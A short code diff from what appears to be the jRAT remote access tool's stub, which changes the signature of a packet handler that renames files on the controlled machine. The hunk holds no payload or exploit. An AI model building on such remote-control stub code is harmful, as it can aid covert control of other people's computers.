@@ -8,7 +8,7 @@ import se.jrat.stub.Connection;
 
 public class Packet47RenameFile extends AbstractIncomingPacket {
 
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		String file = Connection.instance.readLine();
 		String newname = Connection.instance.readLine();
 
